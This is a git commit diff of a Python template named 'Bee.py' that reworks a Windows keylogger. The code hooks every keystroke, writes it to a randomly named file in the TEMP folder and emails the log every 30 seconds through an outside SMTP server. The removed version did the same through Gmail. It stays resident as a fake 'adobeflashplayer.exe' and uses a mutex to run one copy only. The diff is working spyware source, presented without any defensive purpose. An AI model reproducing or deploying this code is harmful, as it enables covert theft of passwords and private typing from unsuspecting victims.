b9b4496452dbeb5f5bf1747abbf9ad2763d0225b
ParanoiaSystem <m.ferraioli25@studenti.unisa.it>
2017-07-01 09:54:23 +0200

    new method

--- Templates/Bee.py
+++ Templates/Bee.py
@@ -1,24 +1,33 @@
 import pythoncom
 import pyHook
 from os import path
-from time import sleep
-from threading import Thread
 import urllib, urllib2
-import smtplib
-import datetime
 import win32com.client
 import win32event, win32api, winerror
 from _winreg import *
 import shutil
 import sys
+import datetime
+import os, random, smtplib, string, time, threading
+from email.mime.text import MIMEText
+
+global logfile
+
+def id_generator(size=6, chars=string.ascii_uppercase + string.digits):
+    return ''.join(random.choice(chars) for _ in range(size))
+
+temp_path = os.getenv('TEMP')
+logfile = temp_path + "\\" + id_generator(15)
+
+f = open(logfile,"a")
+f.write("")
+f.close()
 
 ironm = win32event.CreateMutex(None, 1, 'NOSIGN')
 if win32api.GetLastError() == winerror.ERROR_ALREADY_EXISTS:
     ironm = None
     print "nope"
     sys.exit()
-
-x, data, count= '', '', 0
 
 dir = r"C:\Users\Public\Libraries\adobeflashplayer.exe"
 
@@ -30,76 +39,54 @@ def startup():
 if not path.isfile(dir):
     startup()   
 
-    
-def send_mail():
-    global data
-    while True:
-        if len(data) > 30:
-            timeInSecs = datetime.datetime.now()
-            SERVER = "smtp.gmail.com"
-            PORT = 587
-            USER = EEMAIL
-            PASS = EPASS
-            FROM = USER
-            TO = [USER]
-            SUBJECT = "B33: " + timeInSecs.isoformat() 
-            MESSAGE =  data 
 
-            message_payload = "\r\n".join((
-                                "From: %s" %FROM,
-                                "To: %s" %TO,
-                                "Subject: %s" %SUBJECT,
-                                "",
-                                MESSAGE))
-            try:
-                server = smtplib.SMTP()
-                server.connect(SERVER, PORT)
-                server.starttls()
-                server.login(USER, PASS)
-                server.sendmail(FROM, TO, message_payload)
-                data = ''
-                server.quit()
-            except Exception as error:
-                print error
-        sleep(120)
+def keylogger():
+    def OnKeyboardEvent(event):
+        if event.Ascii != 0 or 8:
+            f = open(logfile,"a")
+            keylogs = chr(event.Ascii)
+            if event.Ascii == 13:
+                keylogs = "\n"
+            f.write(keylogs)
+            f.close()
+
+    hm = pyHook.HookManager()
+    hm.KeyDown = OnKeyboardEvent
+    hm.HookKeyboard()
+    pythoncom.PumpMessages()
 
 
-def pushing(event):
-    global data, lastWindow
-    window = event.WindowName
-    keys = {
-            13: ' [ENTER] ',
-            8: ' [BACKSPACE] ',
-            162: ' [CTRL] ',
-            163: ' [CTRL] ',
-            164: ' [ALT] ',
-            165: ' [ALT] ',
-            160: ' [SHIFT] ',
-            161: ' [SHIFT] ',
-            46: ' [DELETE] ',
-            32: ' [SPACE] ',
-            27: ' [ESC] ',
-            9: ' [TAB] ',
-            20: ' [CAPSLOCK] ',
-            38: ' [UP] ',
-            40: ' [DOWN] ',
-            37: ' [LEFT] ',
-            39: ' [RIGHT] ',
-            91: ' [SUPER] '
-            }
-    keyboardKeyName = keys.get(event.Ascii, chr(event.Ascii))
-    if window != lastWindow:
-        lastWindow = window
-        data += ' { ' + lastWindow + ' } '
-        data += keyboardKeyName 
-    else:
-        data += keyboardKeyName
+def mailsender():
+    username = 'xxxx'
+    password = 'xxxx'
+
+    mittente = 'xxxx'
+    ricevente = 'xxxxx'
+
+    while 1:
+        time.sleep(30)
+        fo = open(logfile, "r")
+        msg = MIMEText(fo.read())
+        fo.close()
+        
+        timeInSecs = datetime.datetime.now()
+        msg['Subject'] = 'Log: ' + timeInSecs.isoformat()
+        msg['From'] = mittente
+        msg['To'] = ricevente
+
+        try:
+            s = smtplib.SMTP('smtp.gmx.com:25')
+            s.login(username,password)
+            s.sendmail(mittente, [ricevente], msg.as_string())
+            s.close()
+            print "Successfully sent email"
+        except Exception, a:
+            print a
+
 
 if __name__ == '__main__':
-    triggerThread = Thread(target=send_mail)
-    triggerThread.start()
+	thread1 = threading.Thread(name="sic1", target=keylogger)
+	thread2 = threading.Thread(name="sic2", target=mailsender)
 
-    hookManager = pyHook.HookManager()
-    hookManager.KeyDown = pushing
-    hookManager.HookKeyboard()
-    pythoncom.PumpMessages()
+	thread1.start()
+	thread2.start()
